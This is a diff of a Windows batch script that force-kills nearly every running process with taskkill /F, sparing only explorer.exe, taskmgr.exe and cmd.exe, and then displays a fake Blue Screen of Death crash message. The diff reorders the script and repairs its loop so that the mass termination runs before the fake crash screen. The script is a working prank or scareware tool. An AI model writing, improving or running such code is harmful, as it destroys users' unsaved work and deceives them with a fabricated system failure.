@@ -1,11 +1,29 @@
 @echo off
-:: Set the CMD window color to blue with white text (simulating BSOD)
+:: Enable delayed variable expansion so that variables inside FOR loops are updated correctly
+setlocal enabledelayedexpansion
+
+:: Close non-essential applications first
+echo Closing non-essential applications...
+tasklist /FI "STATUS eq running" > tasklist.txt
+
+for /F "skip=3 tokens=1,2" %%A in (tasklist.txt) do (
+    set "proc_name=%%A"
+    set "proc_pid=%%B"
+
+    :: Exclude essential Windows processes
+    if /I "!proc_name!" NEQ "explorer.exe" (
+        if /I "!proc_name!" NEQ "taskmgr.exe" (
+            if /I "!proc_name!" NEQ "cmd.exe" (
+                taskkill /F /PID !proc_pid! >nul 2>&1
+                echo Terminated process: !proc_name!
+            )
+        )
+    )
+)
+
+:: Now simulate the BSOD
 color 1F
-
-:: Clear the screen for a cleaner appearance
 cls
-
-:: Display simulated BSOD message
 echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
 echo.
 echo Technical information:
@@ -17,27 +35,3 @@ echo Run CHKDSK /F to check for hard drive corruption, and then restart your com
 echo.
 echo Press any key to continue...
 pause >nul
-
-:: Close non-essential applications
-echo Closing non-essential applications...
-tasklist /FI "STATUS eq running" > tasklist.txt
-for /F "tokens=1,2" %%A in (tasklist.txt) do (
-    set proc_name=%%A
-    set proc_pid=%%B
-    call :close_proc
-)
-
-:: Simulate BSOD window and exit
-exit
-
-:close_proc
-rem Exclude essential Windows processes from being closed
-if /I "%proc_name%" NEQ "explorer.exe" (
-    if /I "%proc_name%" NEQ "taskmgr.exe" (
-        if /I "%proc_name%" NEQ "cmd.exe" (
-            taskkill /F /PID %proc_pid%
-            echo Terminated process: %proc_name%
-        )
-    )
-)
-goto :eof
